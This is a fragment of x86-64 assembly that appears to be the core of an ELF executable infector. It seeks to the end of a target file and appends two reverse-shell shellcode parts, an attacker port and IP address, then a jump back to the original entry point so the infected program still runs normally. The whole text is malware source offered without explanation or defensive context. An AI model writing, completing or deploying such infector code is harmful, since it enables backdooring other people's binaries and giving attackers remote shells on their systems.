;========= Shellcode part 1 =========
    mov rax, 8
    mov rsi, 0
    mov rdx, 2
    syscall

    mov rax, 1
    mov rsi, reverse_shell_1
    mov rdx, reverse_shell_1_len
    syscall

;========= Port (2 bytes, big endian) =========
    mov rax, 8
    mov rsi, 0
    mov rdx, 2
    syscall

    mov rax, 1
    mov rsi, port_result
    mov rdx, 2
    syscall

;========= IP (4 bytes) =========
    mov rax, 8
    mov rsi, 0
    mov rdx, 2
    syscall

    mov rax, 1
    mov rsi, ip_result
    mov rdx, 4
    syscall

;========= Shellcode part 2 =========
    mov rax, 8
    mov rsi, 0
    mov rdx, 2
    syscall

    mov rax, 1
    mov rsi, reverse_shell_2
    mov rdx, reverse_shell_2_len
    syscall

;========= Jump instruction (movabs rax, addr) =========
    mov rax, 8
    mov rsi, 0
    mov rdx, 2
    syscall

    mov rax, 1
    mov rsi, jump_insctruction
    mov rdx, 2
    syscall

;========= Original entry point address =========
    mov rax, 8
    mov rsi, 0
    mov rdx, 2
    syscall

    mov rax, 1
    mov rsi, old_entry_point
    mov rdx, 4
    syscall

;========= Jump opcode (jmp rax) =========
    mov rax, 8
    mov rsi, 0
    mov rdx, 2
    syscall

    mov rax, 1
    mov rsi, jump
    mov rdx, jump_len
    syscall
